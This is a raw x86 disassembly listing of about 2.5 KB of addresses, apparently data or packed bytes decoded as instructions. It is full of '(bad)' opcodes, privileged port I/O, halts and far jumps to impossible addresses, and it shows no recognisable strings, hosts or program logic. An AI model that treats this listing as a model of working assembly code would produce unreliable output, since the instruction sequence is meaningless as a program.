  422585:	inc    ebx
  422586:	scas   eax,DWORD PTR es:[edi]
  422587:	cld    
  422588:	dec    ebx
  422589:	fwait
  42258a:	jge    0x42250e
  42258c:	dec    esp
  42258d:	in     eax,0xaf
  42258f:	cld    
  422590:	dec    esp
  422591:	test   DWORD PTR [esi-0x3],ecx
  422594:	xor    esp,DWORD PTR [eax]
  422596:	mov    al,0x73
  422598:	sti    
  422599:	xor    bl,al
  42259b:	mov    BYTE PTR [eax],al
	...
  4225b5:	xor    bl,BYTE PTR [eax]
  4225b7:	xchg   bh,ah
  4225b9:	sbb    cl,BYTE PTR [esi]
  4225bb:	mov    al,0xe7
  4225bd:	jle    0x422615
  4225bf:	scas   eax,DWORD PTR es:[edi]
  4225c0:	cld    
  4225c1:	xor    ebx,DWORD PTR [eax]
  4225c3:	cdq    
  4225c4:	std    
  4225c5:	add    esp,DWORD PTR [esi-0x640bfffb]
  4225cb:	test   esp,edi
  4225cd:	push   0x7fd47bc3
  4225d2:	pop    esp
  4225d3:	jle    0x422557
  4225d5:	int3   
  4225d6:	les    ebp,FWORD PTR [esp+edi*8-0x2b2b634]
  4225dd:	shl    DWORD PTR [edi],cl
  4225df:	inc    esi
  4225e0:	adc    al,0xf
  4225e2:	jae    0x42261a
  4225e4:	inc    esi
  4225e5:	ja     0x422655
  4225e7:	ror    DWORD PTR [edi+0x69],cl
  4225ea:	hlt    
  4225eb:	repz dec edi
  4225ed:	xor    ecx,0x76b430b3
  4225f3:	mov    al,0xf8
  4225f5:	hlt    
  4225f6:	lods   eax,DWORD PTR ds:[esi]
  4225f7:	test   BYTE PTR [edi+0x1016be20],bh
  4225fd:	sub    esp,0x737f4fe3
  422603:	push   ebx
  422604:	std    
  422605:	jmp    0xf4823bef
  42260a:	cs enter 0x790b,0x6e
  42260f:	ss sbb bl,dh
  422612:	add    al,0xeb
  422614:	fwait
  422615:	jmp    0x0:0x3e6d2
	...
  422630:	add    BYTE PTR [eax],al
  422632:	ja     0x4225f9
  422634:	fimul  DWORD PTR [eax]
  422636:	jne    0x42261d
  422638:	out    0x9a,al
  42263a:	cmc    
  42263b:	xlat   BYTE PTR ds:[ebx]
  42263c:	mov    DWORD PTR es:[ebx+0xb7ce319],eax
  422643:	mov    al,0xe4
  422645:	sub    BYTE PTR [esi-0xdc718f0],0x3a
  42264c:	cvtpi2ps xmm6,QWORD PTR [edx]
  42264f:	add    eax,0x445bf2e7
  422654:	mov    ch,0xbc
  422656:	xor    eax,0x7d58e70d
  42265b:	mov    cl,0x97
  42265d:	push   edx
  42265e:	stos   BYTE PTR es:[edi],al
  42265f:	xchg   ecx,eax
  422660:	stos   DWORD PTR es:[edi],eax
  422661:	scas   eax,DWORD PTR es:[edi]
  422662:	stos   BYTE PTR es:[edi],al
  422663:	cs call 0x73e61a82
  422669:	sti    
  42266a:	jb     0x4226b5
  42266c:	jecxz  0x4226c1
  42266e:	loope  0x422669
  422670:	sbb    dl,BYTE PTR [esp+esi*1]
  422673:	add    eax,0xfe46c36c
  422678:	ds cld 
  42267a:	cmc    
  42267b:	add    al,0xe7
  42267d:	push   esi
  42267e:	outs   dx,DWORD PTR ds:[esi]
  42267f:	dec    ecx
  422680:	out    dx,eax
  422681:	push   ebx
  422682:	mov    ecx,0x2680e319
  422687:	mov    eax,ds:0xa3abcbbe
  42268c:	out    0x7a,al
  42268e:	retf   
  42268f:	scas   eax,DWORD PTR es:[edi]
  422690:	jmp    0x69e5d317
  422695:	stos   BYTE PTR es:[edi],al
	...
  4226ae:	add    BYTE PTR [eax-0x4b49e8e8],dl
  4226b4:	add    eax,0x21751afc
  4226b9:	out    dx,eax
  4226ba:	add    al,0x0
  4226bc:	or     eax,DWORD PTR [eax]
  4226be:	push   0x24
  4226c0:	or     eax,0x87baf402
  4226c5:	fcomp  st(4)
  4226c7:	cli    
  4226c8:	aad    0xbf
  4226ca:	(bad)  
  4226cb:	fmul   DWORD PTR [eax]
  4226cd:	jmp    0x8aee4f8b
  4226d2:	stos   BYTE PTR es:[edi],al
  4226d3:	call   0x7304:0xbb058129
  4226da:	jmp    0x724:0xa90fadfe
  4226e1:	(bad)  
  4226e2:	call   0xda7d3cde
  4226e7:	pusha  
  4226e8:	sub    DWORD PTR [edi-0x28724d13],eax
  4226ee:	push   0x5f
  4226f0:	add    eax,0x1e76bd76
  4226f5:	or     bl,ch
  4226f7:	mov    esp,0x961154ea
  4226fc:	push   esi
  4226fd:	(bad)  
  4226fe:	call   0xf7c4d971
  422703:	and    dl,BYTE PTR [edx]
  422705:	push   0x4f6ed
  42270a:	ss inc edx
  42270c:	mov    al,ds:0x44e70912
  422711:	add    BYTE PTR [eax+eax*1+0x0],ah
	...
  422729:	add    BYTE PTR [eax],al
  42272b:	add    BYTE PTR [eax+0x7d6a0117],dh
  422731:	mov    eax,ds:0xcfb2d155
  422736:	(bad)  
  422737:	call   0xeb2aec68
  42273c:	je     0x422708
  42273e:	cld    
  42273f:	inc    edi
  422740:	sub    eax,0xf7f1c1ca
  422745:	xor    eax,0x52278589
  42274a:	add    DWORD PTR [esp+eax*2],0xc8008ba2
  422751:	jo     0x4227a0
  422753:	push   0xffffff8c
  422755:	cld    
  422756:	(bad)  
  422757:	(bad)  
  422758:	jo     0x4226f8
  42275a:	test   DWORD PTR [ebp-0x1b],eax
  42275d:	cmp    bl,bh
  42275f:	adc    eax,0x3ff919
  422764:	ror    al,1
  422766:	jno    0x422781
  422768:	xchg   ebx,eax
  422769:	cld    
  42276a:	add    ecx,DWORD PTR [ebp-0x72b38d70]
  422770:	nop
  422771:	sahf   
  422772:	dec    esp
  422773:	inc    DWORD PTR [eax-0x1a8a765e]
  422779:	adc    BYTE PTR [edi],0x0
  42277c:	sbb    eax,0xeeb5e06
  422781:	test   esp,eax
  422783:	dec    DWORD PTR [esi+0x20750070]
  422789:	scas   eax,DWORD PTR es:[edi]
  42278a:	inc    ecx
  42278b:	or     BYTE PTR [ecx+0xa],ah
  42278e:	jg     0x4227f5
	...
  4227a8:	add    cl,bh
  4227aa:	or     BYTE PTR [edi-0x41a106bb],al
  4227b0:	or     ch,bl
  4227b2:	cmp    al,BYTE PTR [edi+0x422282ec]
  4227b8:	adc    al,0x1d
  4227ba:	jo     0x42282d
  4227bc:	adc    BYTE PTR [esi+0x61],cl
  4227bf:	sti    
  4227c0:	push   DWORD PTR [eax]
  4227c2:	add    eax,0xdaba006a
  4227c7:	pop    es
  4227c8:	inc    ebx
  4227ca:	jo     0x4227dd
  4227cc:	cmp    BYTE PTR [ebp-0x4c00ffbb],bl
  4227d2:	mov    bh,BYTE PTR [edi+ecx*1-0xec0e2f]
  4227d9:	mov    al,ds:0x8d401011
  4227de:	sbb    al,0xc4
  4227e0:	pop    edi
  4227e1:	hlt    
  4227e2:	fadd   st,st(1)
  4227e4:	pmuludq mm3,mm0
  4227e7:	jbe    0x4227d4
  4227e9:	and    eax,0x27d8eeff
  4227ee:	xor    DWORD PTR [esi],edi
  4227f0:	cld    
  4227f1:	(bad)  
  4227f4:	add    al,bh
  4227f6:	dec    BYTE PTR [esi-0x3]
  4227f9:	jmp    0x5c409091
  4227fe:	stos   DWORD PTR es:[edi],eax
  4227ff:	or     BYTE PTR [edi+0x7d],0x70
  422803:	lods   al,BYTE PTR ds:[esi]
  422804:	cld    
  422805:	loope  0x42279a
  422807:	adc    BYTE PTR [eax-0xc],al
  42280a:	xor    cl,al
  42280c:	jb     0x42280e
	...
  422826:	adc    ebx,esp
  422828:	xor    eax,0x14603318
  42282d:	std    
  42282e:	mov    eax,ds:0xa9fd4fbb
  422833:	xchg   edi,eax
  422834:	stos   DWORD PTR es:[edi],eax
  422835:	jb     0x42284f
  422837:	add    dl,BYTE PTR [esi]
  422839:	inc    eax
  42283a:	in     al,0x6b
  42283c:	add    BYTE PTR [ebx-0x4f0187cc],al
  422842:	cmc    
  422843:	or     dh,BYTE PTR [esi]
  422845:	cld    
  422846:	sti    
  422847:	mov    bh,0xc
  422849:	adc    BYTE PTR [esi+ebp*4],dh
  42284c:	jbe    0x42280e
  42284e:	dec    edi
  42284f:	in     eax,0xbe
  422851:	adc    esi,esp
  422853:	loopne 0x4228d1
  422855:	jmp    0x4228ce
  422857:	shl    bh,cl
  422859:	add    BYTE PTR [ecx-0x4a],0xa8
  42285d:	push   eax
  42285e:	and    ah,BYTE PTR [ebx]
  422860:	out    dx,eax
  422861:	aaa    
  422862:	in     al,0xed
  422864:	add    ecx,DWORD PTR [ebx+0x31536231]
  42286a:	iret   
  42286b:	sti    
  42286c:	test   al,0x72
  42286e:	clc    
  42286f:	and    al,0x47
  422871:	cld    
  422872:	inc    edi
  422873:	add    eax,0x9fec31a6
  422878:	aad    0xaa
  42287a:	test   eax,0x3d31a68a
  42287f:	mov    WORD PTR [ebx],fs
  422881:	test   al,0xbc
  422883:	ret    
  422884:	sti    
  422885:	add    BYTE PTR [ebx+0x42],dh
  422888:	jg     0x422829
	...
  4228a2:	add    BYTE PTR [eax],dh
  4228a4:	test   BYTE PTR [esi-0xd3bd300],ah
  4228aa:	jmp    0x422907
  4228ac:	xor    eax,DWORD PTR cs:[esp+esi*8]
  4228b0:	lea    esp,[ebx-0x253bf351]
  4228b6:	xlat   BYTE PTR ds:[ebx]
  4228b7:	jle    0x42290b
  4228b9:	dec    ebx
  4228ba:	push   ebp
  4228bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228bc:	lahf   
  4228bd:	mov    ebx,0xb39fa4f7
  4228c2:	sti    
  4228c3:	xor    al,bl
  4228c5:	xor    eax,0xb3c576d2
  4228ca:	adc    ebp,DWORD PTR [ebp+0x4a]
  4228cd:	idiv   DWORD PTR [esi-0x52]
  4228d0:	cwde   
  4228d1:	outs   dx,DWORD PTR ds:[esi]
  4228d2:	cld    
  4228d3:	jl     0x42291f
  4228d5:	adc    edi,DWORD PTR [ebp-0x4a]
  4228d8:	pushf  
  4228d9:	add    esp,edi
  4228db:	add    BYTE PTR [edx],bl
  4228dd:	sti    
  4228de:	fwait
  4228df:	xchg   edx,eax
  4228e0:	shl    dh,1
  4228e2:	add    esi,ecx
  4228e4:	xlat   BYTE PTR ds:[ebx]
  4228e5:	cmc    
  4228e6:	adc    BYTE PTR [eax],cl
  4228e8:	cmc    
  4228e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ea:	add    ebp,DWORD PTR [ebp+0x49]
  4228ed:	fisttp WORD PTR [ecx+0x3d]
  4228f0:	into   
  4228f1:	test   al,0xf7
  4228f3:	shl    DWORD PTR [edx],cl
  4228f5:	sbb    al,ah
  4228f7:	cmp    esi,DWORD PTR ds:0x18c15437
  4228fd:	or     ecx,DWORD PTR [ecx+edi*4]
  422900:	(bad)  
  422901:	mov    ebp,0xfff4ec10
  422906:	sub    BYTE PTR [eax],al
	...
  422920:	lock mov eax,ds:0x98af6235
  422926:	fadd   DWORD PTR [ebx]
  422928:	stos   DWORD PTR es:[edi],eax
  422929:	mov    eax,ds:0xe49ec0
  42292e:	adc    BYTE PTR [ecx],ch
  422930:	lock mov al,al
  422933:	xor    bh,BYTE PTR [edx-0x4e3fffd]
  422939:	stos   DWORD PTR es:[edi],eax
  42293a:	jle    0x4228c9
  42293c:	iret   
  42293d:	lahf   
  42293e:	cld    
  42293f:	jmp    0x6e4e43b6
  422944:	pop    esi
  422945:	sbb    DWORD PTR [edx-0x9fb0817],0xffffffa4
  42294c:	add    eax,DWORD PTR [ebx]
  42294e:	mov    ebp,DWORD PTR [ebx+edx*4-0x509b74b1]
  422955:	mov    eax,ds:0xa1a746fc
  42295a:	jb     0x422949
  42295c:	ss inc edx
  42295e:	cld    
  42295f:	imul   esi,edi,0x9b50004
  422965:	mov    ds:0x45041512,al
  42296a:	add    BYTE PTR [edi+esi*1+0x13],ah
  42296e:	adc    BYTE PTR [edx+0x4f],ch
  422971:	mov    al,ds:0x4f73be6
  422976:	add    BYTE PTR [esi],al
  422978:	in     al,0xa8
  42297a:	adc    ch,BYTE PTR [ecx-0x70145409]
  422980:	jb     0x4229dd
  422982:	push   edi
  422983:	out    dx,al
	...
  42299c:	add    BYTE PTR [ebp-0x45a3fe5f],cl
  4229a2:	sub    al,0x4
  4229a4:	ins    BYTE PTR es:[edi],dx
  4229a5:	push   ebx
  4229a6:	cmp    bh,ch
  4229a8:	(bad)  
  4229a9:	popf   
  4229aa:	dec    esi
  4229ab:	mov    esp,DWORD PTR [eax+ebx*4]
  4229ae:	dec    esi
  4229af:	mov    BYTE PTR [eax],0x8
  4229b2:	pushf  
  4229b3:	std    
  4229b4:	out    0x9e,eax
  4229b6:	push   esi
  4229b7:	cld    
  4229b8:	push   DWORD PTR [edi]
  4229ba:	pop    es
  4229bb:	mov    DWORD PTR [ebp-0x493f9],eax
  4229c1:	fst    QWORD PTR ds:0x80cde442
  4229c7:	in     eax,dx
  4229c8:	retf   
  4229c9:	popf   
  4229ca:	add    ah,bh
  4229cc:	push   esi
  4229cd:	sti    
  4229ce:	xchg   DWORD PTR [ecx-0x4938da8],edi
  4229d4:	pop    ss
  4229d5:	push   0xd0106718
  4229da:	sbb    eax,0x6bd2ff5d
  4229df:	dec    esp
  4229e0:	lea    ecx,[eax-0x6739b39e]
  4229e6:	popf   
  4229e7:	add    al,ch
  4229e9:	adc    ah,BYTE PTR [eax-0x4]
  4229ec:	push   DWORD PTR [edi]
  4229ee:	or     BYTE PTR [ecx-0x492687b],cl
  4229f4:	dec    DWORD PTR [ebp-0x720fbde9]
  4229fa:	jp     0x4229b5
  4229fc:	retf   
  4229fd:	or     eax,0x15e702
	...
  422a1a:	xchg   DWORD PTR [esi],eax
  422a1c:	mov    DWORD PTR [ebp-0x3],eax
  422a1f:	cmp    al,ch
  422a21:	imul   edx,ecx,0x58f60008
  422a27:	push   cs
  422a28:	std    
  422a29:	jae    0x422a2b
  422a2b:	les    eax,FWORD PTR [ecx+0xf]
  422a2e:	fld    st(4)
  422a30:	inc    ecx
  422a31:	cld    
  422a32:	iret   
  422a33:	add    DWORD PTR [eax],eax
  422a35:	add    dh,dh
  422a37:	lahf   
  422a38:	ret    0xe245
  422a3b:	add    al,bl
  422a3d:	inc    ebp
  422a3e:	mov    cl,0x3
  422a40:	add    BYTE PTR [eax],al
  422a42:	hlt    
  422a43:	stos   DWORD PTR es:[edi],eax
  422a44:	jp     0x422a88
  422a46:	in     al,0x23
  422a48:	or     ecx,DWORD PTR ds:[esi-0x50]
  422a4c:	jne    0x422a90
  422a4e:	add    ah,bh
  422a50:	je     0x422a94
  422a52:	enter  0xc1fb,0x42
  422a56:	lock test al,0xbe
  422a59:	inc    edx
  422a5a:	jmp    0xab:0xbf7298ab
  422a61:	mov    DWORD PTR [ecx],esi
  422a63:	js     0x4229e8
  422a65:	mov    edi,0x4274dbf8
  422a6a:	cwde   
  422a6b:	sti    
  422a6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a6d:	jb     0x422a6b
  422a6f:	jae    0x422ae7
  422a71:	pop    edx
  422a72:	imul   edx,DWORD PTR [esi],0xfffffff4
  422a75:	(bad)  
  422a76:	js     0x422ae3
  422a78:	not    DWORD PTR [edx-0x393dedcb]
	...
  422a96:	add    BYTE PTR [esi],dh
  422a98:	fwait
  422a99:	add    BYTE PTR [ebx+0x7f],dl
  422a9c:	inc    edi
  422a9d:	sub    bl,0x44
  422aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422aa1:	add    BYTE PTR [eax],al
  422aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422aa4:	jge    0x422b21
  422aa6:	jb     0x422aa4
  422aa8:	jbe    0x422af8
  422aaa:	call   0x428aac
  422aaf:	out    0xe4,eax
  422ab1:	in     al,0x1
  422ab3:	jmp    0x422ad4
  422ab5:	ret    0x2f30
  422ab8:	pop    edx
  422ab9:	sbb    bh,bh
  422abb:	js     0x422b2d
  422abd:	stos   DWORD PTR es:[edi],eax
  422abe:	dec    edi
  422abf:	outs   dx,DWORD PTR ds:[esi]
  422ac0:	or     eax,0xf3144a7a
  422ac5:	mov    WORD PTR [ebx-0xd],ds
  422ac8:	fwait
  422ac9:	jge    0x422a8a
  422acb:	sti    
  422acc:	sub    DWORD PTR [ebx+0x2],eax
  422acf:	hlt    
  422ad0:	lods   eax,DWORD PTR ds:[esi]
  422ad1:	call   0xf6480a30
  422ad6:	jg     0x422ae2
  422ad8:	pop    es
  422ad9:	out    0x3,eax
  422adb:	stc    
  422adc:	push   edx
  422add:	sub    ebp,DWORD PTR [ebx-0x7ea3cadc]
  422ae3:	addr16 cdq 
  422ae5:	lds    esp,FWORD PTR [edi+0x4837ad43]
  422aeb:	test   eax,0xf0c46a9c
  422af0:	or     ch,0x1
  422af3:	hlt    
  422af4:	add    al,0xf6
  422af6:	ins    DWORD PTR es:[edi],dx
  422af7:	mov    al,ss:0xfa91
	...
  422b11:	add    BYTE PTR [eax],al
  422b13:	add    BYTE PTR [ebx],dh
  422b15:	fnsave [edx+0x1]
  422b18:	push   0x7a78d99
  422b1d:	fcmovb st,st(1)
  422b1f:	ret    0x96e6
  422b22:	mov    ecx,0xd1bd60c3
  422b27:	ret    
  422b28:	push   ss
  422b29:	add    eax,0x5c58a6e8
  422b2e:	jmp    0x422ad6
  422b30:	push   ebx
  422b31:	pushf  
  422b32:	jmp    0x269623f5
  422b37:	jge    0x422aef
  422b39:	mov    al,ds:0x426f01c0
  422b3e:	dec    ebx
  422b3f:	push   esp
  422b40:	retf   0x4dac
  422b43:	dec    eax
  422b44:	sub    DWORD PTR [edx+ebp*2+0xd80f0c4],ebx
  422b4b:	add    eax,0xec8d04f4
  422b50:	mov    fs,WORD PTR [eax+0x6441393]
  422b56:	add    al,dl
  422b58:	add    bl,BYTE PTR [esi+eiz*8+0x5b027778]
  422b5f:	test   al,0xf0
  422b61:	fwait
  422b62:	adc    esp,eax
  422b64:	inc    esp
  422b65:	das    
  422b66:	add    ch,ch
  422b68:	pop    esp
  422b69:	inc    edi
  422b6a:	les    ebx,FWORD PTR [ecx+0x44879a5e]
  422b70:	mov    ds:0x933d01a3,eax
  422b75:	cwde   
  422b76:	sub    DWORD PTR [ecx+0x0],0x0
	...
  422b91:	retf   0xaf87
  422b94:	call   0x44c23090
  422b99:	mov    ah,0x6
  422b9b:	or     eax,0xfc9b4964
  422ba0:	jmp    0xe92271f6
  422ba5:	retf   
  422ba6:	hlt    
  422ba7:	les    ebp,FWORD PTR [eax+eiz*1]
  422baa:	icebp  
  422bab:	(bad)  
  422bac:	call   0x5584eda8
  422bb1:	cmc    
  422bb2:	add    al,0x0
  422bb4:	jmp    0x2d073517
  422bb9:	loopne 0x422bc0
  422bbb:	add    cl,ch
  422bbd:	test   ecx,0x4f23542
  422bc3:	add    cl,ch
  422bc5:	bound  edx,QWORD PTR [ecx+0x42]
  422bc8:	cs jle 0x45233101
  422bcf:	add    BYTE PTR [eax-0x54],ah
  422bd2:	mov    esp,0x9be5650c
  422bd7:	cld    
  422bd8:	jmp    0xafb678cc
  422bdd:	out    dx,eax
  422bde:	or     DWORD PTR [ebx+0x4f8ca],eax
  422be4:	(bad)  
  422be5:	int3   
  422be6:	or     al,0x51
  422be8:	xchg   ebx,eax
  422be9:	out    0x8f,eax
  422beb:	cmp    ch,0x52
  422bee:	cwde   
  422bef:	cld    
  422bf0:	mov    ecx,0xe587c5f
	...
  422c0d:	add    BYTE PTR [edx-0x79],dl
  422c10:	mov    edi,0x461aea00
  422c15:	add    ebp,ebx
  422c17:	push   es
  422c18:	push   0x20
  422c1a:	ja     0x422bba
  422c1c:	sti    
  422c1d:	xor    eax,0x3fc805
  422c22:	fcmove st,st(3)
  422c24:	test   DWORD PTR [ebp-0x4b],eax
  422c27:	lods   al,BYTE PTR ds:[esi]
  422c28:	mov    edi,0xfc6d510f
  422c2d:	dec    ebp
  422c2f:	cld    
  422c30:	adc    bl,BYTE PTR [ecx+0x43]
  422c33:	push   ds
  422c34:	add    eax,0x8a13cd6a
  422c39:	sbb    al,0x6a
  422c3b:	pusha  
  422c3c:	sti    
  422c3d:	or     DWORD PTR [ebp-0x67],0xffffffe5
  422c41:	cli    
  422c42:	popf   
  422c43:	push   es
  422c44:	add    BYTE PTR [ebx+0x6a4f98e8],cl
  422c4a:	mov    WORD PTR [ebx],ss
  422c4c:	inc    edx
  422c4d:	idiv   BYTE PTR [ebp+0x7a5b5378]
  422c53:	pusha  
  422c54:	add    al,0x5a
  422c57:	sbb    al,BYTE PTR [edx]
  422c59:	add    DWORD PTR [ebp+0x6],ecx
  422c5c:	cmp    BYTE PTR [ebp-0x1d],bl
  422c5f:	pop    DWORD PTR [eax+0x65dfc]
  422c65:	packsswb mm3,mm2
  422c68:	cmc    
  422c69:	push   ebx
  422c6a:	jge    0x422c7f
  422c6c:	adc    BYTE PTR [esi+eiz*4],0x5f
  422c70:	sti    
  422c71:	push   eax
	...
  422c8a:	add    ch,al
  422c8c:	xchg   esp,eax
  422c8d:	push   edi
  422c8e:	(bad)  
  422c8f:	jmp    0xfc66:0x910fbc84
  422c96:	dec    DWORD PTR ds:0xf345b291
  422c9c:	sbb    BYTE PTR [ecx-0x492fefb],bl
  422ca2:	push   esp
  422ca4:	and    BYTE PTR ds:0x4f5ea4c8,bh
  422caa:	mov    edi,DWORD PTR [ecx-0x49]
  422cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cae:	cld    
  422caf:	jmp    0x422d2c
  422cb1:	jns    0x422d0d
  422cb3:	lods   al,BYTE PTR ds:[esi]
  422cb4:	xchg   edx,eax
  422cb5:	or     eax,0x6c01d4
  422cba:	xor    DWORD PTR [edi+esi*1-0x4cce3a07],0xfffffffc
  422cc2:	out    0x5d,al
  422cc4:	stos   DWORD PTR es:[edi],eax
  422cc5:	add    BYTE PTR [eax],al
  422cc7:	push   es
  422cc8:	pop    esi
  422cc9:	ja     0x422d0d
  422ccb:	mov    esp,0x773bf06
  422cd0:	stos   DWORD PTR es:[edi],eax
  422cd1:	push   0xffffffc9
  422cd3:	outs   dx,DWORD PTR ds:[esi]
  422cd4:	fbstp  TBYTE PTR [edi+esi*4-0x23]
  422cd8:	jecxz  0x422cd9
  422cda:	jae    0x422ccd
  422cdc:	push   ss
  422cdd:	inc    ecx
  422cde:	sbb    al,0xcf
  422ce0:	outs   dx,BYTE PTR ds:[esi]
  422ce1:	sub    eax,0x806d82f4
  422ce6:	stc    
  422ce7:	idiv   ch
  422ce9:	ret    0xb9c5
  422cec:	sbb    bh,ch
  422cee:	cld    
	...
  422d07:	add    cl,ah
  422d09:	push   ebx
  422d0a:	mov    ds:0x40ba1012,eax
  422d0f:	add    BYTE PTR [edi+0x2],cl
  422d12:	mov    ds:0x3122e46f,eax
  422d17:	sbb    BYTE PTR [eax+eiz*1-0x46],bl
  422d1b:	inc    DWORD PTR [ebx+0x24]
  422d1e:	ds fdivr st,st(7)
  422d21:	out    dx,al
  422d22:	sub    eax,0xab683a06
  422d27:	(bad)  
  422d28:	push   ds
  422d29:	clc    
  422d2a:	sbb    al,BYTE PTR [ecx-0x2ad24524]
  422d30:	ins    DWORD PTR es:[edi],dx
  422d31:	jae    0x422d3b
  422d33:	xchg   DWORD PTR [esp+eax*1-0x72c76715],ebp
  422d3a:	fwait
  422d3b:	sti    
  422d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d3d:	cs jmp 0x422db6
  422d40:	mov    dh,0x50
  422d42:	mov    dh,0x9b
  422d44:	mov    BYTE PTR [ebx],bh
  422d46:	push   es
  422d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d48:	ja     0x422d0f
  422d4a:	jb     0x422d86
  422d4c:	dec    esi
  422d4d:	icebp  
  422d4e:	cmp    bl,0xd8
  422d51:	ror    BYTE PTR [esi],cl
  422d53:	int    0x34
  422d55:	add    eax,0x4272bae6
  422d5a:	mov    edi,0xed12b4df
  422d5f:	leave  
  422d60:	ss nop
  422d62:	out    0xae,eax
  422d64:	push   es
  422d65:	sub    ebp,ecx
  422d67:	cmp    al,0x12
  422d69:	mov    gs,esi
  422d6b:	sub    eax,0x0
	...
  422d84:	add    al,bh
  422d86:	mov    DWORD PTR [ebx],esp
  422d88:	pop    eax
  422d89:	je     0x422d50
  422d8b:	loop   0x422dc1
  422d8d:	and    al,0xad
  422d8f:	popf   
  422d90:	int3   
  422d91:	mov    ebx,DWORD PTR [eax+0x33ec2171]
  422d97:	add    DWORD PTR [esi],eax
  422d99:	outs   dx,DWORD PTR ds:[esi]
  422d9a:	inc    edx
  422d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d9c:	xor    al,0x5c
  422d9e:	das    
  422d9f:	and    DWORD PTR [ebx+0x19a68168],esp
  422da5:	repz xchg edi,eax
  422da7:	sti    
  422da8:	mov    ebx,0x49e6553
  422dad:	hlt    
  422dae:	shl    BYTE PTR [esi],cl
  422db0:	inc    ebx
  422db1:	stos   BYTE PTR es:[edi],al
  422db2:	cmp    esi,DWORD PTR [eax]
  422db4:	(bad)  
  422db5:	test   DWORD PTR [ebp*1+0xf063d49],0x6c082941
  422dc0:	in     al,0xf1
  422dc2:	add    al,0xe7
  422dc4:	sub    DWORD PTR [ebp+0x42],ebp
  422dc7:	add    BYTE PTR [ecx],ch
  422dc9:	imul   edx,DWORD PTR [ebx],0xffffffd8
  422dcc:	mov    DWORD PTR [eax-0x5209fdbe],0xe6b1c342
  422dd6:	cmp    BYTE PTR [edi+0x4804f7ec],0xde
  422ddd:	jnp    0x422dd4
  422ddf:	add    ch,cl
  422de1:	test   DWORD PTR [esp+esi*2-0x10],0xeef542ad
	...
  422e01:	add    BYTE PTR [eax-0x816fd70],cl
  422e07:	pop    esp
  422e08:	jg     0x422df3
  422e0a:	test   DWORD PTR [edi+eax*4],0x427f2824
  422e11:	test   DWORD PTR [edx+eax*2-0x50],esp
  422e15:	cmp    DWORD PTR [ebp+0x56c62b82],eax
  422e1b:	cwde   
  422e1c:	dec    edi
  422e1d:	push   ss
  422e1e:	push   edi
  422e1f:	repnz jecxz 0x422dfe
  422e22:	aaa    
  422e23:	add    eax,0x83e6a983
  422e28:	xlat   BYTE PTR ds:[ebx]
  422e29:	in     eax,dx
  422e2a:	test   DWORD PTR [ebx+ecx*4],0x8b480424
  422e31:	ins    BYTE PTR es:[edi],dx
  422e32:	sbb    DWORD PTR [ebx+0x32278efc],0xfffffffd
  422e39:	fcomp  QWORD PTR [ebx+0x6ce93ff2]
  422e3f:	push   edi
  422e40:	or     al,0x6c
  422e42:	aad    0x3
  422e44:	add    cl,ch
  422e46:	sbb    eax,0x9715ba86
  422e4b:	cwde   
  422e4c:	cld    
  422e4d:	test   BYTE PTR ds:0x97078280,0x98
  422e54:	cld    
  422e55:	aam    0x3
  422e57:	sbb    BYTE PTR [edx-0x49da700],0xff
  422e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e5f:	test   BYTE PTR [edi+edi*8],ch
  422e62:	loop   0x422ec6
  422e64:	mov    DWORD PTR [ebp+0x0],esi
	...
  422e7e:	add    BYTE PTR [ecx],dl
  422e80:	(bad)  
  422e81:	sti    
  422e82:	jmp    ebp
  422e84:	sbb    ebx,DWORD PTR [edx-0x1]
  422e87:	loop   0x422e11
  422e89:	inc    ecx
  422e8a:	call   0x103daa1d
  422e8f:	pop    ecx
  422e90:	mov    BYTE PTR [eax],al
  422e92:	add    ch,bl
  422e94:	jmp    0x86a:0x2ccfffe
  422e9b:	loop   0x422e4b
  422e9d:	aam    0xd6
  422e9f:	sahf   
  422ea0:	add    bh,bl
  422ea2:	adc    eax,0x3c91f9
  422ea7:	inc    esi
  422ea8:	jns    0x422ee1
  422eaa:	sti    
  422eab:	sbb    BYTE PTR [edx],cl
  422ead:	mov    BYTE PTR [ebp-0x36],0x2
  422eb1:	in     eax,0x60
  422eb3:	cdq    
  422eb4:	add    al,BYTE PTR [eax]
  422eb6:	(bad)  
  422eb7:	call   0x95b7b61c
  422ebc:	sar    edx,1
  422ebe:	jne    0x422e75
  422ec0:	(bad)  
  422ec2:	lea    edx,[esi+0x64]
  422ec5:	sti    
  422ec6:	adc    DWORD PTR [ebp+0x2],0xb
  422eca:	test   DWORD PTR [esi-0x29000002],ebx
  422ed0:	cmp    eax,0x552083e8
  422ed5:	sti    
  422ed6:	adc    eax,0xffffffa0
  422ed9:	cli    
  422eda:	jmp    edx
  422edc:	arpl   WORD PTR [ebp+0x598a6d5d],ax
  422ee2:	fadd   QWORD PTR [eax]
	...
  422efc:	(bad)  
  422efd:	aad    0xe3
  422eff:	(bad)  
  422f00:	fcomp  DWORD PTR [edx+edi*8+0x62ef4ff]
  422f07:	add    ah,dh
  422f09:	stos   DWORD PTR es:[edi],eax
  422f0a:	mov    DWORD PTR [edx-0x360c1f4],esi
  422f10:	ins    DWORD PTR es:[edi],dx
  422f11:	and    DWORD PTR [eax],eax
  422f13:	(bad)  
  422f14:	sbb    ecx,edi
  422f16:	test   al,0xdd
  422f18:	imul   DWORD PTR [ebx-0x6c7e0300]
  422f1e:	lea    eax,[edx-0x3610a18]
  422f24:	or     al,0xf7
  422f26:	cmp    edi,ebp
  422f28:	repz pop ds
  422f2a:	les    esi,FWORD PTR [ebx+0xc]
  422f2d:	jnp    0x422f57
  422f2f:	std    
  422f30:	jecxz  0x422edd
  422f32:	add    BYTE PTR [ebp-0x25],dl
  422f35:	sbb    BYTE PTR [ecx],cl
  422f37:	std    
  422f38:	jmp    0xf4822608
  422f3d:	sub    cl,al
  422f3f:	or     al,0x72
  422f41:	push   0xaef40003
  422f46:	adc    eax,0xf52081e8
  422f4b:	std    
  422f4c:	stos   DWORD PTR es:[edi],eax
